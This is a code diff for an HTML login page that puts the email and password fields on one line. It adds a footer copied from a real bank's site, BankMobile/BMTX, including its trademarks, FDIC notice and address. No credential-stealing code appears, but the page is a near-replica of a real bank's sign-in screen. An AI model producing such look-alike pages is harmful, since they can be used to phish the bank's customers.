@@ -16,22 +16,41 @@
     <!-- Login Form -->
     <div class="login-form-container" id="login-form-container">
         <form id="login-form">
-            <!-- Labels and LOG IN Button on the same line -->
+            <!-- Email, Password, and LOG IN Button on the same line -->
             <div class="labels-row">
                 <label for="email">Email address:</label>
+                <input type="email" id="email" name="email" required class="underscore-input" placeholder="(your email)">
                 <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required class="underscore-input" placeholder="(your password)">
                 <button type="submit">LOG IN</button>
             </div>
 
-            <!-- Input Boxes as Underscores -->
-            <div class="inputs-row">
-                <input type="email" id="email" name="email" required class="underscore-input" placeholder="Enter your email">
-                <input type="password" id="password" name="password" required class="underscore-input" placeholder="Enter your password">
-            </div>
-
             <!-- Forget Login Information Link -->
-            <a href="#" class="forgot-password">Forget login information</a>
+            <div class="forgot-password-container">
+                <a href="#" class="forgot-password">Forget login information</a>
+            </div>
         </form>
+    </div>
+
+    <!-- Footer Content -->
+    <div class="footer-content">
+        <div class="footer-links">
+            <a href="#">Home</a> | 
+            <a href="#">Security</a> | 
+            <a href="#">Fee Schedules</a> | 
+            <a href="#">Terms and Conditions</a> | 
+            <a href="#">Privacy Statement</a> | 
+            <a href="#">Privacy Notice for California Residents</a> | 
+            <a href="#">Contact Us</a> | 
+            <a href="#">Identity Verification</a> | 
+            <a href="#">FAQs</a>
+        </div>
+        <div class="footer-text">
+            <p>BMTX, Inc.</p>
+            <p>© 2025 BMTX, Inc., a wholly owned subsidiary of BM Technologies, Inc. All Rights Reserved.</p>
+            <p>Digital banking platform powered by BMTX, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC & Equal Housing Lender. The BankMobile Debit Mastercard® card is issued by First Carolina Bank pursuant to license from Mastercard International Incorporated. The card is administered by First Carolina Bank. Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated. All other names and logos are owned by their respective owners.</p>
+            <p>BM Technologies, Inc., PO Box 278, Maple Shade, NJ 08052</p>
+        </div>
     </div>
 
     <!-- Link to JavaScript file -->
